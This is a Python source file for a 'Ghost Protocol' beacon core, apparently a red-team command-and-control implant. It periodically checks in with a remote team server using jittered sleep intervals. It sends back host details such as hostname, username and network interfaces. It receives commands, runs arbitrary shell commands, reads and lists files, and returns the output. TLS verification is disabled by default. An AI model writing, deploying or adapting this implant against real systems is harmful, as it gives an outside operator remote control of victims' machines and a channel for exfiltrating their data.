"""
Ghost Protocol Beacon Core Implementation
"""

import asyncio
import logging
import json
import random
import uuid
import platform
import os
import time
from typing import Dict, List, Any, Optional
from datetime import datetime, timedelta

import aiohttp
import aiofiles


class BeaconCore:
    """Ghost Protocol Beacon Core"""
    
    def __init__(self, config):
        self.config = config
        self.logger = logging.getLogger(__name__)
        
        # Beacon configuration
        self.beacon_id = getattr(config.beacon, 'beacon_id', None) or str(uuid.uuid4())
        self.server_url = config.beacon.server_url
        self.sleep_interval = config.beacon.sleep_interval
        self.jitter_percent = min(config.beacon.jitter_percent, 50)  # Max 50% jitter
        self.user_agent = config.beacon.user_agent
        self.proxy_url = getattr(config.beacon, 'proxy_url', None)
        self.verify_ssl = getattr(config.beacon, 'verify_ssl', False)
        
        # Runtime state
        self._running = False
        self.session: Optional[aiohttp.ClientSession] = None
        self.last_checkin = None
        self.system_info = {}
        
        # Command queue and results
        self.pending_commands: List[Dict[str, Any]] = []
        self.command_results: List[Dict[str, Any]] = []
        
    async def start(self) -> bool:
        """Start the beacon"""
        try:
            self.logger.info(f"Starting beacon {self.beacon_id}")
            
            # Collect system information
            self.system_info = await self._collect_system_info()
            
            # Create HTTP session
            connector_args = {}
            if self.proxy_url:
                connector_args['trust_env'] = True
            
            connector = aiohttp.TCPConnector(
                ssl=self.verify_ssl,
                **connector_args
            )
            
            timeout = aiohttp.ClientTimeout(total=30)
            headers = {"User-Agent": self.user_agent}
            
            self.session = aiohttp.ClientSession(
                connector=connector,
                timeout=timeout,
                headers=headers
            )
            
            # Initial check-in
            if await self._checkin(initial=True):
                self._running = True
                self.logger.info("Beacon started successfully")
                return True
            else:
                self.logger.error("Initial check-in failed")
                return False
                
        except Exception as e:
            self.logger.error(f"Failed to start beacon: {e}")
            return False
    
    async def stop(self) -> bool:
        """Stop the beacon"""
        try:
            self._running = False
            
            if self.session:
                await self.session.close()
            
            self.logger.info("Beacon stopped")
            return True
            
        except Exception as e:
            self.logger.error(f"Error stopping beacon: {e}")
            return False
    
    async def run_forever(self):
        """Run the beacon main loop"""
        while self._running:
            try:
                # Calculate sleep time with jitter
                sleep_time = self._calculate_sleep_time()
                
                # Check in with server
                await self._checkin()
                
                # Process any pending commands
                await self._process_commands()
                
                # Sleep until next check-in
                await asyncio.sleep(sleep_time)
                
            except KeyboardInterrupt:
                break
            except Exception as e:
                self.logger.error(f"Error in beacon main loop: {e}")
                # Sleep before retrying
                await asyncio.sleep(30)
    
    def _calculate_sleep_time(self) -> float:
        """Calculate sleep time with jitter"""
        jitter_range = self.sleep_interval * (self.jitter_percent / 100.0)
        jitter = random.uniform(-jitter_range, jitter_range)
        return max(1.0, self.sleep_interval + jitter)
    
    async def _checkin(self, initial: bool = False) -> bool:
        """Check in with the team server"""
        try:
            url = self.server_url.rstrip('/')
            
            # Prepare check-in data
            checkin_data = {
                "beacon_id": self.beacon_id,
                "timestamp": datetime.utcnow().isoformat(),
                "command_results": self.command_results.copy()
            }
            
            if initial:
                checkin_data["system_info"] = self.system_info
            
            # Add beacon ID to headers
            headers = {"X-Beacon-ID": self.beacon_id}
            
            # Make request
            if initial or self.command_results:
                # POST for initial checkin or when sending results
                async with self.session.post(
                    url,
                    json=checkin_data,
                    headers=headers,
                    proxy=self.proxy_url
                ) as response:
                    if response.status == 200:
                        data = await response.json()
                        self.pending_commands.extend(data.get("commands", []))
                        self.command_results.clear()
                        self.last_checkin = datetime.utcnow()
                        return True
            else:
                # GET for regular checkins
                async with self.session.get(
                    url,
                    headers=headers,
                    proxy=self.proxy_url
                ) as response:
                    if response.status == 200:
                        data = await response.json()
                        self.pending_commands.extend(data.get("commands", []))
                        self.last_checkin = datetime.utcnow()
                        return True
            
            return False
            
        except Exception as e:
            self.logger.error(f"Check-in failed: {e}")
            return False
    
    async def _process_commands(self):
        """Process pending commands"""
        while self.pending_commands and self._running:
            command_data = self.pending_commands.pop(0)
            
            try:
                command_id = command_data.get("id")
                command = command_data.get("command")
                args = command_data.get("args", {})
                
                self.logger.info(f"Executing command: {command}")
                
                # Execute command
                result = await self._execute_command(command, args)
                
                # Store result
                self.command_results.append({
                    "command_id": command_id,
                    "success": result.get("success", True),
                    "output": result.get("output", ""),
                    "timestamp": datetime.utcnow().isoformat()
                })
                
            except Exception as e:
                self.logger.error(f"Error executing command: {e}")
                self.command_results.append({
                    "command_id": command_data.get("id"),
                    "success": False,
                    "output": f"Command execution error: {e}",
                    "timestamp": datetime.utcnow().isoformat()
                })
    
    async def _execute_command(self, command: str, args: Dict[str, Any]) -> Dict[str, Any]:
        """Execute a command"""
        try:
            if command == "shell":
                return await self._execute_shell_command(args.get("cmd", ""))
            elif command == "pwd":
                return {"success": True, "output": os.getcwd()}
            elif command == "cd":
                path = args.get("path", "")
                os.chdir(path)
                return {"success": True, "output": f"Changed directory to {os.getcwd()}"}
            elif command == "ls" or command == "dir":
                path = args.get("path", ".")
                items = os.listdir(path)
                return {"success": True, "output": "\n".join(items)}
            elif command == "cat" or command == "type":
                filepath = args.get("file", "")
                async with aiofiles.open(filepath, 'r') as f:
                    content = await f.read()
                return {"success": True, "output": content}
            elif command == "sysinfo":
                return {"success": True, "output": json.dumps(self.system_info, indent=2)}
            elif command == "sleep":
                new_interval = args.get("interval", self.sleep_interval)
                self.sleep_interval = max(1, new_interval)
                return {"success": True, "output": f"Sleep interval updated to {self.sleep_interval}s"}
            elif command == "exit":
                self._running = False
                return {"success": True, "output": "Beacon shutting down"}
            else:
                return {"success": False, "output": f"Unknown command: {command}"}
                
        except Exception as e:
            return {"success": False, "output": f"Command error: {e}"}
    
    async def _execute_shell_command(self, cmd: str) -> Dict[str, Any]:
        """Execute a shell command"""
        try:
            process = await asyncio.create_subprocess_shell(
                cmd,
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.STDOUT
            )
            
            stdout, _ = await process.communicate()
            output = stdout.decode('utf-8', errors='replace')
            
            return {
                "success": process.returncode == 0,
                "output": output,
                "return_code": process.returncode
            }
            
        except Exception as e:
            return {"success": False, "output": f"Shell command error: {e}"}
    
    async def _collect_system_info(self) -> Dict[str, Any]:
        """Collect system information"""
        try:
            import socket
            
            # Basic system info
            info = {
                "beacon_id": self.beacon_id,
                "hostname": socket.gethostname(),
                "platform": platform.system(),
                "platform_release": platform.release(),
                "platform_version": platform.version(),
                "architecture": platform.architecture()[0],
                "processor": platform.processor(),
                "python_version": platform.python_version(),
                "username": os.getenv('USER') or os.getenv('USERNAME') or 'unknown',
                "pid": os.getpid(),
                "cwd": os.getcwd(),
                "timestamp": datetime.utcnow().isoformat()
            }
            
            # Network interfaces
            try:
                import psutil
                interfaces = []
                for interface, addrs in psutil.net_if_addrs().items():
                    for addr in addrs:
                        if addr.family == socket.AF_INET:
                            interfaces.append({
                                "interface": interface,
                                "ip": addr.address,
                                "netmask": addr.netmask
                            })
                info["network_interfaces"] = interfaces
                
                # System resources
                info["cpu_count"] = psutil.cpu_count()
                info["memory_total"] = psutil.virtual_memory().total
                info["memory_available"] = psutil.virtual_memory().available
                info["disk_usage"] = {
                    "total": psutil.disk_usage('/').total,
                    "free": psutil.disk_usage('/').free
                }
            except ImportError:
                # Fallback if psutil not available
                info["network_interfaces"] = []
                info["cpu_count"] = os.cpu_count() or 1
            
            return info
            
        except Exception as e:
            self.logger.error(f"Error collecting system info: {e}")
            return {
                "beacon_id": self.beacon_id,
                "hostname": "unknown",
                "platform": platform.system(),
                "error": str(e)
            }
